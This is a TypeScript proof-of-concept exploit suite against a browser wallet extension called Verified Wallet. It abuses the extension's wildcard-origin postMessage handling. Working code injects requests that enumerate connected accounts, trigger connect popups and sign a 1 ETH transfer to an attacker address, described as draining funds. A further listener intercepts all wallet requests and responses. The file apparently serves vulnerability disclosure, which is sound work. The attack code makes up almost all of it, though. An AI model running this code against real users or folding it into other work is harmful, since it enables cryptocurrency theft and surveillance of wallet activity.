/**
 * PoC #2: Message Injection Attack
 * 
 * Vulnerability: The Verified Wallet extension uses postMessage with wildcard
 * origin ("*") for both sending requests and receiving responses. The content
 * script only checks if evnt.source === window, not the actual origin.
 * 
 * Impact: 
 * 1. Malicious pages can inject requests to the wallet
 * 2. Malicious iframes could potentially intercept wallet responses
 * 3. Cross-origin attacks may be possible via embedded iframes
 * 
 * Severity: HIGH (CVSS 7.0-8.9)
 */

interface VWRequest {
  type: "VW_REQ";
  id: string;
  params: {
    method: string;
    params?: any;
  };
}

interface VWResponse {
  type: "VW_RES";
  id: string;
  params: {
    success: boolean;
    response?: string;
    error?: string;
    data?: any;
    saveToStorage?: boolean;
  };
}

// Generate a random message ID like the real extension does
function generateMessageId(): string {
  return Math.random().toString(36).substring(2);
}

/**
 * PoC 2a: Inject a request to retrieve connected accounts
 * This simulates a malicious script trying to see if a wallet is connected
 */
async function injectAccountsRequest(): Promise<any> {
  return new Promise((resolve, reject) => {
    const messageId = generateMessageId();
    
    console.log("🎯 PoC 2a: Injecting eth_accounts request...");
    
    const handler = (event: MessageEvent) => {
      if (event.source !== window) return;
      if (event.data?.type !== "VW_RES") return;
      if (event.data?.id !== messageId) return;
      
      window.removeEventListener("message", handler);
      
      if (event.data.params.success) {
        console.log("✅ SUCCESS: Retrieved accounts without user consent!");
        console.log("   Accounts:", event.data.params.data);
        resolve(event.data.params.data);
      } else {
        console.log("❌ Request failed:", event.data.params.error);
        reject(event.data.params.error);
      }
    };
    
    window.addEventListener("message", handler);
    
    // Inject the malicious request
    const maliciousRequest: VWRequest = {
      type: "VW_REQ",
      id: messageId,
      params: {
        method: "eth_accounts"
      }
    };
    
    window.postMessage(maliciousRequest, "*");
    
    // Timeout after 5 seconds
    setTimeout(() => {
      window.removeEventListener("message", handler);
      reject("Timeout waiting for response");
    }, 5000);
  });
}

/**
 * PoC 2b: Attempt to trigger eth_requestAccounts without user visiting malicious dApp
 * This would cause a popup to appear, potentially phishing the user
 */
async function injectConnectRequest(): Promise<any> {
  return new Promise((resolve, reject) => {
    const messageId = generateMessageId();
    
    console.log("🎯 PoC 2b: Injecting eth_requestAccounts (wallet connect popup)...");
    console.log("   This may trigger a popup window from the extension!");
    
    const handler = (event: MessageEvent) => {
      if (event.source !== window) return;
      if (event.data?.type !== "VW_RES") return;
      if (event.data?.id !== messageId) return;
      
      window.removeEventListener("message", handler);
      
      console.log("📥 Received response:", event.data.params);
      
      if (event.data.params.success) {
        console.log("✅ SUCCESS: Connection approved!");
        console.log("   Vault data:", event.data.params.data);
        resolve(event.data.params.data);
      } else {
        console.log("⚠️  Connection rejected or failed:", event.data.params.error);
        reject(event.data.params.error);
      }
    };
    
    window.addEventListener("message", handler);
    
    const maliciousRequest: VWRequest = {
      type: "VW_REQ",
      id: messageId,
      params: {
        method: "eth_requestAccounts"
      }
    };
    
    window.postMessage(maliciousRequest, "*");
    
    setTimeout(() => {
      window.removeEventListener("message", handler);
      reject("Timeout - user may have declined or popup was blocked");
    }, 60000); // 60 second timeout for user interaction
  });
}

/**
 * PoC 2c: Inject a transaction request with malicious parameters
 * This simulates trying to get the user to sign a transaction
 */
async function injectMaliciousTransaction(attackerAddress: string): Promise<any> {
  return new Promise((resolve, reject) => {
    const messageId = generateMessageId();
    
    console.log("🎯 PoC 2c: Injecting malicious eth_sendTransaction...");
    console.log("   Target address:", attackerAddress);
    
    const handler = (event: MessageEvent) => {
      if (event.source !== window) return;
      if (event.data?.type !== "VW_RES") return;
      if (event.data?.id !== messageId) return;
      
      window.removeEventListener("message", handler);
      
      if (event.data.params.success) {
        console.log("💀 CRITICAL: Transaction signed!");
        console.log("   TX Hash:", event.data.params.data);
        resolve(event.data.params.data);
      } else {
        console.log("✅ Transaction blocked:", event.data.params.error);
        reject(event.data.params.error);
      }
    };
    
    window.addEventListener("message", handler);
    
    // Malicious transaction to drain funds
    const maliciousRequest: VWRequest = {
      type: "VW_REQ",
      id: messageId,
      params: {
        method: "eth_sendTransaction",
        params: [{
          to: attackerAddress,
          value: "0xDE0B6B3A7640000", // 1 ETH in hex
          data: "0x",
          gas: "0x5208" // 21000
        }]
      }
    };
    
    window.postMessage(maliciousRequest, "*");
    
    setTimeout(() => {
      window.removeEventListener("message", handler);
      reject("Timeout - user may have declined");
    }, 60000);
  });
}

/**
 * PoC 2d: Response Interception - Set up listener for ANY wallet response
 * A malicious script could monitor all wallet communications
 */
function setupResponseInterceptor(): void {
  console.log("🎯 PoC 2d: Setting up response interceptor...");
  console.log("   All VW_RES messages will be logged below:\n");
  
  window.addEventListener("message", (event) => {
    if (event.data?.type === "VW_RES") {
      console.log("📡 INTERCEPTED WALLET RESPONSE:");
      console.log("   ID:", event.data.id);
      console.log("   Success:", event.data.params?.success);
      console.log("   Data:", JSON.stringify(event.data.params?.data, null, 2));
      console.log("---");
    }
    
    if (event.data?.type === "VW_REQ") {
      console.log("📡 INTERCEPTED WALLET REQUEST:");
      console.log("   ID:", event.data.id);
      console.log("   Method:", event.data.params?.method);
      console.log("   Params:", JSON.stringify(event.data.params?.params, null, 2));
      console.log("---");
    }
  });
  
  console.log("✅ Interceptor active. Use the dApp normally to see intercepted messages.");
}

// Run PoCs
async function runAllPoCs(): Promise<void> {
  console.log("=" .repeat(60));
  console.log("VERIFIED WALLET - MESSAGE INJECTION PoC SUITE");
  console.log("=" .repeat(60) + "\n");
  
  // Set up interceptor first to catch everything
  setupResponseInterceptor();
  
  console.log("\n--- Testing account enumeration ---\n");
  try {
    await injectAccountsRequest();
  } catch (e) {
    console.log("Account enumeration result:", e);
  }
  
  // Uncomment to test further attacks:
  // await injectConnectRequest();
  // await injectMaliciousTransaction("0xYourAttackerAddressHere");
}

runAllPoCs();

export { 
  injectAccountsRequest, 
  injectConnectRequest, 
  injectMaliciousTransaction,
  setupResponseInterceptor 
};
